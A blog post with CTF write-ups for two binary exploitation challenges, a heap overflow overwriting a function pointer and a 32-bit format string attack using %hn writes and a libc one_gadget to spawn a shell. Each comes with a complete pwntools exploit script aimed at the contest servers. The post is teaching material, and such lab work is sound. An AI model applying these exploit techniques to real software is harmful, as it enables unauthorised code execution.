---
title: Detailed Writeups: Binary Exploitation
summary: Detailed binary exploitation writeups from UMD CTF and WPICTF , heap based overflow + format string vulnerability
date: "2020-04-20T00:00:00Z"

reading_time: true  # Show estimated reading time?
share: true  # Show social sharing links?
profile: true  # Show author profile?
comments: true  # Show comments?
# Optional header image (relative to `static/img/` folder).
header:
  caption: ""
  image: ""
---

To make sure that i learned something well , i always want to write an article about that topic and it'll be an opportunity to do more researchs about it.
The last two days our team Fword participated in two CTFs (UMD CTF and WPICTF) and we were among the top 20 teams in both CTFs so GJ guys <3 anyway that's why i decided to choose the best pwn tasks and write these detailed writeups about them to be a great practical introduction for people who want to dive into binary exploitation .

**Note:** This article assumes that you have basic knowledge of assembly and C language

## Summary ##

1- **Jump Not Found** From UMD CTF : heap based overflow

2- **Dorsia3** From WPI CTF: Format string Vulnerability

## Jump Not Found 400pts (25 solves) ##

![TASK](https://imgur.com/nerLXcA.png)

**Note:** You can Download the binary [HERE](https://github.com/kahla-sec/CTF-Writeups/blob/master/UMDCTF%202020/Jump%20Not%20Found/JNF), give it a try alone before reading the writeup that's the best way to LEARN .

### TL;DR ###

- Exploit a Heap based overflow to overwrite a function address with the Win function address

- Bypass a little problem of the presence of "0x0a"("\n") in the Win function address

### Introduction ###

Before diving into the exploitation part , let's talk about the heap section ,you have probably heard or used **malloc** or **calloc** functions in C ,
these functions are used to allocate memory on the heap,it is a region of your computer's memory that is not managed automatically for you and used for dynamic memory allocation, unlike the stack which we dont have full control over it.

![SECTIONS](https://imgur.com/aVPbDZM.png)

The allocation algorithm in an abstract way is quite simple , we won't dive into too much details , when for example we want to allocate a chunk of 16 bytes using malloc, it's reserved in the heap and malloc returns the address of the beginning of the chunk where we can store the data we want.

You may be asking how your computer knows where the next free chunk starts ? That's quite simple, before each allocated chunk its size is allocated just before it, so the address of the next free chunk will be :

> Address of the beginning of chunk1 + Its size 

This was in a really abstract way , you can do more research alone if you are interested , there is a lot of ressources in the internet :D

![Allocation](https://imgur.com/7ewvjK7.png)

### Exploitation ###

Let the fun begin now :D after downloading the binary let's do some basic reverse engineering and read carefully its code , i used ghidra for that purpose , you can download it from its official website.

![CODE](https://imgur.com/Ra3YFyG.png)

Observing the main function , we can notice that it's allocation two chunks , the first one its size is 0x42 (66 bytes) where our input will be stored and a second chunk which holds an array of function pointers , and based on our input (1 or 2 or 3) the program will call the appropriate function from the heap .

```C
  local_20 = (char *)malloc(0x42);
  local_18 = (code **)malloc(0x18);
  *local_18 = jumpToHoth;
  local_18[1] = jumpToCoruscant;
  local_18[2] = jumpToEndor;
```
Of course as the most vigilant readers noticed , it's using the dangerous function **gets** so we have the possibility to overflow stuffs :D Now here is our plan:

We will abuse the gets function and overwrite the jumpToHoth address with **jumpToNaboo** function which will prints the flag for us
Before that we need to figure out the offset so let's open the binary in gdb, set a breakpoint after gets and enter a simple pattern

![GDB](https://imgur.com/Xpc9YFp.png)

After that let's visualize the interesting part of the heap 

![HEAP](https://imgur.com/qb2XMHG.png)

As you can see the "AAAAAAAABBBBBBBB" that we have entered followed by the array of function pointers , so the offset is obvious now which is 80, let's begin writing our exploit :

```python

from pwn import *
p=process("./JNF")
#p=remote("192.241.138.174",9996)
p.recvuntil("CONSOLE>")
WIN=p64(0x000000000040070e)
OFFSET="1"+"A"*79
payload=OFFSET
payload+=WIN
p.sendline(payload)
log.info("Found Flag ! ")
p.interactive()

```

The reason why i wrote **OFFSET="1"+"A"*79** is that if you have read the code carefully we will notice that the choice of the function that will be executed is loaded from the beginning of the chunk (which is logic) so i wanted to do it in one shot.

```C
        gets(local_20);
        lVar2 = strtol(local_20,&local_28,10);
        *(short *)(local_20 + 0x40) = (short)lVar2;
        sVar1 = *(short *)(local_20 + 0x40);
        if (sVar1 != 2) break;
        puts("Checking navigation...");
        (*local_18[1])();
      }
      if (2 < sVar1) break;
      if (sVar1 == 1) { .....
```
**Why 0x000000000040070e not the real address 0x000000000040070a**

![FUNC](https://imgur.com/LcvZ0yt.png)

As we know gets function stops when it encounters "\n" (0x0a) so entering the real address of the win function will terminate our input and thus we will never be able to write the address where we want :(
Fortunately observing the assembly code of **jumpToNaboo** function we will see that we can start from the address that holds the part we want , which is printing the flag :

![ASSEMBLY](https://imgur.com/YEv55cw.png)

And Finally running the exploit will bring the flag for us :D

![FLAG](https://imgur.com/Hzqpy0X.png)

That was a quite simple example of exploiting a heap based overflow thus it was only solved by 25 teams from 321 teams . Let's pass now to the second task which is a format string vulnerability.

## Dorsia3 250pts (55 solves) ##

![TASK](https://imgur.com/CkCR80H.png)

**Note:** You can Download the binary [HERE](https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/nanoprint) and the libc [HERE](https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/libc.so.6), give it a try alone before reading the writeup that's the best way to LEARN .

### TL;DR ###

- Exploit a format string vulnerability to overwrite the return pointer + Libc one gadget

### Introduction ###

As a quick introduction this is a brief explanation of the format string vulnerability :

>  format string is a type of software vulnerability. Originally thought harmless, format string exploits can be used to crash a program or to execute harmful code. The problem stems from the use of unchecked user input as the format string parameter in certain C functions that perform formatting, such as printf(). A malicious user may use the %s and %x format tokens, among others, to print data from the call stack or possibly other locations in memory. One may also write arbitrary data to arbitrary locations using the %n format token, which commands printf() and similar functions to write the number of bytes formatted to an address stored on the stack. 
_**Wikipedia**_

A quick Example :

![FMT](https://imgur.com/1ImQ6zG.png)

If things are not clear for you you can search for more ressources about format string vulnerabilities . Let the hack begin now :D

### Exploitation ###

In this task we are given the source code of the task , the binary and the libc .

![CODE](https://imgur.com/26HRSAR.png)

As you can see we can notice the format string vulnerability in the printf function and we have a leak of our buffer address in the stack and the system function.

![BINARY](https://imgur.com/by2UA23.png)

Let's do some static analysis , running the file and checksec commands , we get these results:

![OUT](https://imgur.com/krietXO.png)

So we have a 32 bit binary with PIE and NX protections enabled , so we won't be able to overwrite the GOT entry of a function since its address is randomized .

**Let's Get our hands dirty**

Firstly , let's create a pad function to make sure that the offset won't change and let's find the offset of our format string to know exactly where our buffer starts.

```python
from pwn import *
def pad(str):
        return str+(60-len(str))*"B"
p=process("./nanoprint")
p.recvline()
p.sendline(pad("BAAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|"))
p.interactive()
```

![OUT](https://imgur.com/065Lo1y.png)

So our offset will be 7 , now let's talk about our scenario , we will overwrite the saved eip with a one gadget from the libc ==> Spawn a shell \o/

We have all we need , an address from the stack and the system function address from libc, so let's write our exploit and retrieve these address properly

```python
from pwn import *
def pad(str):
        return str+(60-len(str))*"B"
p=process("./nanoprint")
#p=remote("dorsia3.wpictf.xyz",31337)
data=p.recvline()
BUFFER=int(data[:10],16)
SYSTEM=int(data[-11:-1],16)+288
log.info("Buffer starts: "+hex(BUFFER))
log.info("System address: "+hex(SYSTEM))
pause()
p.sendline(pad("JUNK"))
p.interactive()


```

Since we have the libc binary let's calculate the libc base , and using gdb lets run the first part of our exploit and try to figure the offset between our buffer and the saved eip :

1- Run our little exploit

2- run gdb with the following command:

>gdb -p \`pidof nanoprint\`

![GDB](https://imgur.com/3sALPs3.png)

![OUT](https://imgur.com/1KGRjzU.png)

So the offset is 0x71 ,finally  let's choose the one gadget , i have used the famous [one_gadget](https://github.com/david942j/one_gadget) tool

![LIBC](https://imgur.com/Ly6WJjh.png)

After some debugging with gdb i figured that the constraints of this magic gadget are verified so we will use it in our exploit

> 0x3d0e0 execve("/bin/sh", esp+0x40, environ)

>constraints:

>esi is the GOT address of libc
 
> [esp+0x40] == NULL


now we have everything we need let's finish our exploit :

```python
from pwn import *
def pad(str):
        return str+(60-len(str))*"B"
#p=process("./nanoprint")
p=remote("dorsia3.wpictf.xyz",31337)
data=p.recvline()
BUFFER=int(data[:10],16)
SYSTEM=int(data[-11:-1],16)+288
log.info("Buffer starts: "+hex(BUFFER))
log.info("System address: "+hex(SYSTEM))
BASE=SYSTEM-0x3d200
one_gadget=BASE+0x3d0e0
RET=BUFFER+0x71
RET2=RET+2
log.info("Writing to: "+hex(RET))
payload="B"
payload+=p32(RET)
payload+=p32(RET2)
off1=(one_gadget & 0xffff)-9 #First 2 bytes
off2=int(hex(one_gadget & 0xffff0000)[:-4],16)-(one_gadget & 0xffff)  
log.info("one gadget address: "+hex(one_gadget))
log.info("offset1 and 2: "+str(off1)+"|"+str(off2))
payload+="%"+str(off1)+"x"
payload+="%7$hn"
payload+="%"+str(off2)+"x"
payload+="%8$hn"
#pause()
p.sendline(pad(payload))
p.interactive()

#Offset buffer-ret : +0x71
#offset fmt 7

```

Running our exploit will spawn the shell for us \o/ 

![SHELL](https://imgur.com/MWLKHRX.png)

Thank you for reading the whole writeup :D I hope you liked it , you can check my github repo where i share my [CTF writeups](https://github.com/kahla-sec/CTF-Writeups) ! Arigatoo \o/

